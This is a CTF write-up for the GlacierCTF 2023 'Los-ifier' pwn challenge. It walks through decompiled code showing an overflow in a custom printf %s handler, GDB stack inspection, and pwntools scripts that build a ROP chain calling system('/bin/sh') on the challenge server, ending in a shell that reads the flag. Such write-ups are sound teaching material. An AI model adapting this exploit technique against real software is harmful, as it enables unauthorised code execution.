---
title: Los-ifier
date: 2023-11-24T20:00:00+02:00
description: Writeup for Los-ifier [GlacierCTF 2023]
author: PineBel
tags:
- pwn
draft: false
---

## Challenge Description:

Normal binary for normal people.

## Intuition 


First we run a checksec and a file on the binary and we can see that it's statically linked and that it lacks PIE. 
When first opening the binary in Ghidra we see a simple main function with nothing special, we can also observe that there is a function named setup() called, let's investigate. When opening the function, there is an interesting call made : register_printf_specifier(0x73,printf_handler,printf_arginfo_size). What this actually does is handling the %s fromat  specifier from the printf() function, let's see how the printf is handled in the printf_handler function. We observe another weird function, named loscopy() which takes three parameters. The first one is the address of local_58 + 3, the second one is our input and the last one is 10 ('\n'). Opening the loscopy function  we can see an overflow vulnerability inside of the while. 
 

 ```c
 undefined8 main(void)

{
  char local_108 [256];
  
  setup();
  fgets(local_108,0x100,(FILE *)stdin);
  printf("-> %s\n",local_108);
  return 0;
}

void setup(void)

{
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stdout,(char *)0x0);
  register_printf_specifier(0x73,printf_handler,printf_arginfo_size);
  return;
}

size_t printf_handler(FILE *param_1,undefined8 param_2,undefined8 *param_3)

{
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  size_t local_18;
  undefined8 local_10;
  
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_10 = *(undefined8 *)*param_3;
  local_58 = 0x736f4c;
  loscopy((long)&local_58 + 3,local_10,10);
  local_18 = strlen((char *)&local_58);
  fwrite(&local_58,1,local_18,param_1);
  return local_18;
}


void loscopy(char *param_1,char *param_2,char param_3)

{
  char *local_18;
  char *local_10;
  
  local_18 = param_2;
  local_10 = param_1;
  while (param_3 != *local_18) {
    *local_10 = *local_18;
    local_18 = local_18 + 1;
    local_10 = local_10 + 1;
  }
  return;
}

```
 
 ## Solution 
 
 Let's see what we can get from GDB, putting a breakpoint in the loscopy() function we can see that we can overwrite the __printf_function_invoke() with our input.  

```
[#0] 0x40182c → loscopy()
[#1] 0x4018d0 → printf_handler()
[#2] 0x43c3b7 → __printf_function_invoke()
[#3] 0x405672 → printf_positional()
[#4] 0x4072b7 → __printf_buffer()
[#5] 0x409181 → __vfprintf_internal()
[#6] 0x404d19 → printf()
[#7] 0x4019c6 → main()

gef➤  x/20g 0x00007fffffffc940
0x7fffffffc940: 0x00007fffffffc9c0      0x00000000004018d0
0x7fffffffc950: 0x0000000000000000      0x00007fffffffc9e0
0x7fffffffc960: 0x00007fffffffcc30      0x00007fffffffca00
0x7fffffffc970: 0x4141414141736f4c      0x4141414141414141
0x7fffffffc980: 0x0000414141414141      0x0000000000000000
0x7fffffffc990: 0x0000000000000000      0x0000000000000000
0x7fffffffc9a0: 0x0000000000000000      0x0000000000000000
0x7fffffffc9b0: 0x0000000000000000      0x00007fffffffdc00
0x7fffffffc9c0: 0x00007fffffffc9e0      0x000000000043c3b7
0x7fffffffc9d0: 0x0000000000000000      0x00007fffffffcc30
```


The question now is, with what do we overwrite the __printf_function_invoke() address. Remembering that it's statically linked we can craft a payload and invoke a shell. First we need to see how much padding there is needed  10*8+5 bytes. To create this exploit we use a small ROP chain (gadgets were found with ROPgadget) , first we need to put the “/bin/sh” address into RDI (system's argument register) and then we should return to system. Let's see if it works! 

Getting the addresses of system and /bin/sh:

```
gef➤  p system
$1 = {<text variable, no debug info>} 0x404ae0 <system>

gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/home/kali/CTF/Glacier/Losifier/Losifier/chall'(0x478000-0x4a0000), permission=r--
  0x478010 - 0x478017  →   "/bin/sh" 
  0x4784d9 - 0x4784e0  →   "/bin/sh" 
```


Initial payload:
```py
from pwn import *

target = remote( "chall.glacierctf.com" ,13392 )
p = b"\x00"*(10*8+5)


p += p64(0x0000000000402188) # pop rdi; ret
p += p64(0x478010) # pointer to /bin/sh
p += p64(0x404ae0) # system


target.sendline(p)
target.interactive()
```


Mhmm, it doesn't work, let's see why. The error we got is: stopped 0x4047c8 in do_system (), reason: SIGSEGV. The problem is that the stack should be aligned in 16-byte bounderies, to fix this, we use a ret gadget for padding (found with ROPGadget). So our final payload looks like this:

```py
from pwn import *

target = remote( "chall.glacierctf.com" ,13392 )
p = b"\x00"*(10*8+5)

p += p64(0x000000000040101a) # ret for stack alignment 
p += p64(0x0000000000402188) # pop rdi; ret
p += p64(0x478010) # pointer to /bin/sh
p += p64(0x404ae0) # system


target.sendline(p)
target.interactive()
```

## Flag 

Running the script we get:

```
$ python3 payload_clever.py
[+] Opening connection to chall.glacierctf.com on port 13392: Done
[*] Switching to interactive mode
$ ls
app
flag.txt
$ cat flag.txt
gctf{th1s_1s_th3_@riginol_fl@9}
```



